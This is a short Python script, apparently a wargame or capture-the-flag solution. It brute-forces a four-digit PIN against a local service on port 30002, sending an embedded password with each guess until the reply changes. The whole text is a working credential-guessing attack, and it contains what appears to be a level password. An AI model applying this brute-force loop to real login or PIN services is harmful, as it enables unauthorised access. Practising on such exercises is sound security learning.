import sys; import socket as so
out, pin, s = set(), 2580, so.socket(so.AF_INET, so.SOCK_STREAM)
s.connect(("127.0.0.1", 30002)); s.recv(2048);
while len(out)!=2: s.sendall(("UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"+" "+"0"*(4-len(str(pin)))+str(pin)+"\n").encode()); out.add(s.recv(1024).decode('utf-8')); pin+=1
print(min(out))
